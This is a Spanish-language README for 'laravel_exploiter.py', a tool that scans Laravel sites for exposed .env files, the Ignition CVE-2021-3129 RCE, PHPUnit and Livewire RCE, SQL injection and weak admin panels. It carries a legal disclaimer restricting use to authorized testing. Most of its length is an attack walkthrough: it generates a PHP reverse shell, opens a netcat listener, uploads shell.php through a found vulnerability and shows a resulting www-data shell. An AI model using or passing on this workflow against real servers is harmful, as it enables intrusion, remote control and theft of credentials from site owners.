
```ascii
██████╗  █████╗ ███╗   ██╗██╗███████╗██╗         ██████╗  █████╗ ███╗   ███╗██╗██████╗ ███████╗███████╗
██╔══██╗██╔══██╗████╗  ██║██║██╔════╝██║         ██╔══██╗██╔══██╗████╗ ████║██║██╔══██╗██╔════╝╚══███╔╝
██║  ██║███████║██╔██╗ ██║██║█████╗  ██║         ██████╔╝███████║██╔████╔██║██║██████╔╝█████╗    ███╔╝ 
██║  ██║██╔══██║██║╚██╗██║██║██╔══╝  ██║         ██╔══██╗██╔══██║██║╚██╔╝██║██║██╔══██╗██╔══╝   ███╔╝  
██████╔╝██║  ██║██║ ╚████║██║███████╗███████╗    ██║  ██║██║  ██║██║ ╚═╝ ██║██║██║  ██║███████╗███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
```

<div align="center">
  
[![Matrix SVG](https://raw.githubusercontent.com/rodrigograca31/rodrigograca31/master/matrix.svg)](https://github.com/ELDANI1)

</div>

# Laravel Security Testing Tool

Herramienta de seguridad para pruebas de penetración en aplicaciones Laravel.

## ⚠️ ADVERTENCIA LEGAL

**ESTA HERRAMIENTA ES SOLO PARA:**

- Pruebas de penetración autorizadas
- Auditorías de seguridad en sistemas propios
- Entornos de testing controlados
- Educación e investigación en seguridad

**NO UTILICES ESTA HERRAMIENTA EN SISTEMAS SIN AUTORIZACIÓN EXPLÍCITA.**

## 🚀 Características

- Detección de archivos .env expuestos
- Prueba de vulnerabilidades Laravel Ignition (CVE-2021-3129)
- Detección de PHPUnit RCE
- Prueba de Livewire RCE
- Fuerza bruta en paneles de administración
- Escaneo de inyecciones SQL
- Búsqueda de archivos sensibles
- Prueba de conexión MySQL
- Generación de reverse shell

## 📦 Instalación

### Requisitos

```bash
# Python 3.6+
python3 --version

# Dependencias
pip3 install requests

# Herramientas opcionales (recomendadas)
sudo apt install mysql-client sqlmap


# Clonar el repositorio
git clone 
cd laravel-security-tool

# Hacer ejecutable
chmod +x laravel_exploiter.py

# Ejecutar directamente
./laravel_exploiter.py

#Escaneo básico

python3 laravel_exploiter.py ejemplo.com

#Escaneo con credenciales de base de datos

python3 laravel_exploiter.py ejemplo.com --db-user admin --db-pass password --db-name laravel_db

#Generar reverse shell

python3 laravel_exploiter.py ejemplo.com --shell

·Todos los parámetros
bash
python3 laravel_exploiter.py https://ejemplo.com \
# --app-key "base64-app-key" \
# --db-user "usuario_db" \
# --db-pass "password_db" \
# --db-name "nombre_db"

Exposición de .env - Verifica si el archivo de configuración está accesible

Laravel Ignition RCE - Prueba CVE-2021-3129

PHPUnit RCE - Detecta eval-stdin.php expuesto

Livewire RCE - Prueba vulnerabilidades en Livewire

Fuerza bruta - Paneles de administración comunes

SQL Injection - Parámetros comunes y payloads básicos

Archivos sensibles - Lista de archivos comunes expuestos

Conexión MySQL - Solo si se proporcionan credenciales

# EJEMPLO DE SALIDA 
🚀 LARAVEL EXPLOITATION TOOL
⚠️  SOLO PARA PRUEBAS ÉTICAS EN SISTEMAS AUTORIZADOS

[*] INICIANDO EXPLOTACIÓN COMPLETA PARA: https://ejemplo.com
============================================================
[*] Verificando exposición de .env...
[+] .env EXPUESTO - Credenciales disponibles
[*] Probando Laravel Ignition RCE (CVE-2021-3129)...
[-] Error en Ignition RCE: timeout
...
[+] RESUMEN DE EXPLOTACIÓN:
[+] ENV_EXPOSED: VULNERABLE
[-] IGNITION_RCE: No vulnerable
...


🤝 Contribuciones
Las contribuciones son bienvenidas. Por favor:

# 1. Generar el shell
python3 laravel_exploiter.py ejemplo.com --shell

# El script preguntará:
# Tu IP para reverse shell: [INGRESA_TU_IP_AQUI]
# Puerto [4444]: [ENTER o ingresa otro puerto]

# 2. Poner tu máquina en escucha (en otra terminal)
nc -lvnp 4444

# 3. Subir el archivo shell.php al servidor vulnerable
# (usando alguna vulnerabilidad encontrada)

# 4. Acceder a la shell subida via navegador o curl
# http://ejemplo.com/shell.php 


## SOLO SI Encuentras que el objetivo tiene .env expuesto

#Descubres credenciales válidas en el panel de admin

#Encuentras un RCE funcionando (Ignition, PHPUnit, etc.)

#Subes el shell.php al servidor

#Accedes via navegador a http://ejemplo.com/shell.php

#Obtienes una shell en tu terminal con Netcat   


#EJEMPLO DE REVERSHELL 
# Terminal 1 - Generar shell
$ python3 laravel_exploiter.py mi-sitio.com --shell
Tu IP para reverse shell: 192.168.1.100
Puerto [4444]: 9999
[+] Reverse shell generado: shell.php
[*] Ejecuta: nc -lvnp 9999 antes de subir el shell

# Terminal 2 - Escuchar conexión
$ nc -lvnp 9999
listening on [any] 9999 ...

# Subir shell.php al servidor (usando vulnerabilidad encontrada)
# Luego acceder via: http://mi-sitio.com/uploads/shell.php

# Cuando se ejecute el shell, verás en Terminal 2:
connect to [192.168.1.100] from (UNKNOWN) [mi-sitio.com] 54322
whoami
www-data
pwd
/var/www/html


Consideraciones importantes:
Firewalls: El servidor podría tener firewalls que bloqueen conexiones salientes

Filtrado: El servidor podría filtrar/borrar archivos .php

Detección: Antivirus/WAF podrían detectar el shell

Permisos: Necesitas permisos de escritura en algún directorio web

# NFO SI PARA QUE NO FALLE KALI 
# Actualizar Kali
sudo apt update

# Instalar dependencias
sudo apt install -y python3 python3-pip mysql-client sqlmap

# Clonar el repositorio
git clone 
cd laravel-security-tool

# Instalar dependencias de Python
pip3 install requests

# Ejecutar
python3 laravel_exploiter.py ejemplo.com